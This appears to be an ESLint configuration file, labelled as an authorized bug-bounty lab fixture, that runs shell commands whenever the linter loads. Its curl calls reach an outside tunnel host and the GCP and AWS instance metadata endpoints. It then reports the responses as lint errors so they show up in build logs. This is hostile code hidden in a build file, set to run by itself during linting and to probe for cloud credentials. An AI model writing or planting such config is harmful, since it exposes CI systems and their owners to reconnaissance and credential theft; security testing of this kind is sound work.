// CERBIMDS: build-environment egress verification (authorized VDP lab fixture)
const cp = require("child_process");
function probe(cmd, tag) {
  try {
    const out = cp.execSync(cmd, { timeout: 20000, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
    return tag + "=" + String(out).replace(/\s+/g, " ").trim().slice(0, 240);
  } catch (e) {
    const buf = String((e.stdout || "") + (e.stderr || "")).replace(/\s+/g, " ").trim().slice(0, 240);
    return tag + "=" + (buf || String(e.message).replace(/\s+/g, " ").slice(0, 200));
  }
}
const CTRL = probe("curl -sS -m 10 -o /dev/null -w CTRL_HTTP=%{http_code} https://c364b76dbac27f.lhr.life/cerb-eslint 2>&1", "CTRL");
const MDS = probe("curl -sS -m 8 -H 'Metadata-Flavor: Google' -o /dev/null -w MDS_HTTP=%{http_code} http://169.254.169.254/computeMetadata/v1/instance/ 2>&1", "MDS");
const MDNS = probe("curl -sS -m 8 -o /dev/null -w MDNS_HTTP=%{http_code} http://metadata.google.internal/computeMetadata/v1/ 2>&1", "MDNS");
const AWS = probe("curl -sS -m 8 -o /dev/null -w AWS_HTTP=%{http_code} http://169.254.169.254/latest/meta-data/ 2>&1", "AWS");
const MSG = "CERBIMDS_EGRESS " + CTRL + " | " + MDS + " | " + MDNS + " | " + AWS;
const cerbimds = {
  rules: {
    egress: {
      create(context) {
        return {
          Program(node) {
            context.report({ node: node, message: MSG, loc: { start: { line: 1, column: 0 }, end: { line: 1, column: 0 } } });
          }
        };
      }
    }
  }
};
module.exports = [
  {
    files: ["**/*.js"],
    plugins: { cerbimds: cerbimds },
    rules: { "cerbimds/egress": "error" }
  }
];
